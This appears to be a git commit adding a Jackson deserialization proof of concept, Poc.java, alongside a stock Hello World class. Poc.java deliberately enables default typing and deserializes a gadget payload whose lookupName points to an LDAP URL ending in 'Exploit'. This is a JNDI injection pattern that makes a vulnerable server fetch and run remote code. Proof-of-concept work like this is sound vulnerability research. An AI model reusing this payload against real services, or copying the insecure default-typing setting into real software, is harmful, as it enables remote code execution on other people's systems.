2091f445bc1ce00a12e42c119e62ca1e823504a8
Al1ex <38161463+Al1ex@users.noreply.github.com>
2020-05-21 23:02:17 +0800

    Add files via upload

---
+++ src/main/java/com/jacksonTest/App.java
@@ -0,0 +1,13 @@
+package com.jacksonTest;
+
+/**
+ * Hello world!
+ *
+ */
+public class App 
+{
+    public static void main( String[] args )
+    {
+        System.out.println( "Hello World!" );
+    }
+}
---
+++ src/main/java/com/jacksonTest/Poc.java
@@ -0,0 +1,20 @@
+package com.jacksonTest;
+
+import com.fasterxml.jackson.databind.ObjectMapper;
+
+import java.io.IOException;
+
+public class Poc {
+    public static void main(String[] args) throws Exception{
+        ObjectMapper mapper = new ObjectMapper();
+        mapper.enableDefaultTyping();
+        String json="[\"com.caucho.config.types.ResourceRef\",{\"lookupName\": \"ldap://127.0.0.1:1099/Exploit\"}]";
+        try {
+            Object obj = mapper.readValue(json, Object.class);
+            mapper.writeValueAsString(obj);
+        }catch(IOException e){
+            e.printStackTrace();
+        }
+    }
+
+}
